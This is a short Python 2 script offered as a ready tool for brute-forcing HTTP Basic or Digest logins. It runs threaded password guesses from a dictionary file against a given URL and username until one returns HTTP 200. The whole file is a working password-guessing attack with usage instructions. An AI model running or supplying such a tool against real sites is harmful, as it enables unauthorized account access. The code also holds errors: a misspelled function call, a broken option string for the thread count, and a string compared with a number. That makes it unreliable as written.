#!/usr/bin/python
import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
	print'''	************************************
		BASE OR DIGENT BRUTEFORCE AUTH
		***********************************'''

def usage():
	print "		Usage: "
	print " 	-w: url (http://randomsite.com)"
	print "		-u: username "
	print "		-t: Number of threads"
	print " 	-f: dictionary file"
	print "		-m: Method (basic or digest)"
	print "		Example: baseordegestauth.py -w http://randomsite.com -u admin -t 5 -f passwords.txt -m method"

class request_performer(Thread):
	def __init__(self,passwd,user,url,method):
		Thread.__init__(self)
		self.password=passwd.split("\n")[0]
		self.username = user
		self.url = url
		self.method = method
		print "-" + self.password +"-"
	def run(self):
		global hit
		if hit == "1":
			try:
				if self.method =="basic":
					r = requests.get(self.url, auth=(self.username, self.password))
				elif self.method =="digest":
					r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
				if r.status_code ==200:
					hit = "0"
					print "[+] Password Found - " + self.password
					sys.exit()
				else:
					print "[-] Password is not valid: " + self.password
					i[0] = i[0]-1
			except Exception, e:
				print e


def start(argv):
	banner()
	if len(sys.argv) < 5:
		usage()
		sys.exit()
	try:
		opts, args = getopt.getopt(argv,"u:w:f:m:t")
	except getopt.GetoptError:
		print"Error on Arguments"
		sys.exit()
	for opt, arg in opts:
		if opt=='-u':
			user =arg
		elif opt=='-w':
			url=arg
		elif opt=='-f':
			dictionary=arg
		elif opt=='-m':
			method=arg
		elif opt=='-t':
			threads=arg
	
	try:
		f=open(dictionary, "r")
		passwords = f.readlines()
	except:
		print "File does not exist" 
		sys.exit()
	lancher_threads(passwords,threads,user,url,method)

def launcher_threads(passwords,th,username,url,method):
	global i
	i = []
	i.append(0)
	while len(passwords):
		if hit =="1":
			try:
				if i[0] <th:
					passwd=passwords.pop(0)
					i[0] = i[0] +1
					thread = request_performer(passwd, username, url, method)
					thread.start()
			except KeyboardInterrupt:
				print "Interrupted"
				sys.exit()
			thread.join()

if __name__ =="__main__":
	try:
		start(sys.argv[1:])
	except KeyboardInterrupt:
		print "Interrrupted"
